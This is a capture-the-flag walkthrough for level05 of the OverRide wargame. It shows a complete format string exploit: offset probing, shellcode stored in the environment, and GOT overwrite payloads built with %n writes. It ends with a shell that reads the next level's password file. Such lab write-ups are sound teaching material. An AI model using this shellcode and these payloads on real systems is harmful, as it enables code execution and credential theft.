## WALKTHROUGH - LEVEL05

---

The program waits for an input, and uppercases every lowercase character in it.  
At the end, it passes our input to printf as the only argument, so we
should be able to use a format string attack.  

The **exploit** is as follow :
 - **Find the offset with %x**;
 - **Replace the exit@plt address with the start of our shellcode**.

---

We need to find the offset for the printf arguments:

```sh
level05@OverRide:~$ chmod 777 .
level05@OverRide:~$ python -c 'print "aaaa" + " %x"*12' > payload
level05@OverRide:~$ cat payload | ./level05
aaaa 64 f7fcfac0 f7ec3af9 ffffd5ef ffffd5ee 0 ffffffff ffffd674 f7fdb000 61616161 20782520 25207825
level05@OverRide:~$ python -c 'print "aaaa" + " %10$x"' > payload
level05@OverRide:~$ cat payload | ./level05
aaaa 61616161
```

As we can see, **printf** starts to read the arguments on the buffer at the **10th offset**.

---

We export our shellcode on the environment to avoid the lowercase/uppercase problem:

```sh
level05@OverRide:~$ export PAYLOAD=$(python -c 'print "\x90" * 30 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
```

We then use gdb to find the address of our shellcode. When we look at our environment, we see our shellcode is on the 27th variable.

```gdb
(gdb) p *((char**)environ+27)
$6 = 0xffffdf5d "PAYLOAD=[SHELLCODE]"
(gdb) p *((char**)environ+27)+10
$7 = 0xffffdf67 "\220\220\220\220[SHELLCODE]"
```

The shellcode is at the address **0xffffdf67**.

---

We then need to find the address of the exit function on the .got.plt:

```gdb
(gdb) disas 0x8048370
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *0x80497e0
```

The exit@plt jumps on the address **0x80497e0**.

---
For the exploit, we will use the **"two bytes write" method** since the shellcode address is a large number.

- For the **low address** at **0x80497e0**:  
We need to write **0xdf67 - 8** because we will write 2 addresses before, so 4 bytes each.

```gdb
(gdb) p 0xdf67-8
$2 = 57183
```

- For the **high address** at **0x80497e2**:  
We need to **substract the low address from the high address**:

```gdb
(gdb) p 0xffff-0xdf67
$6 = 8344
```

Now we only need to put our payload together:

```sh
level05@OverRide:~$ python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57183x%10$n" + "%8344x%11$n"' > payload
level05@OverRide:~$ cat payload - | ./level05
[...]
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
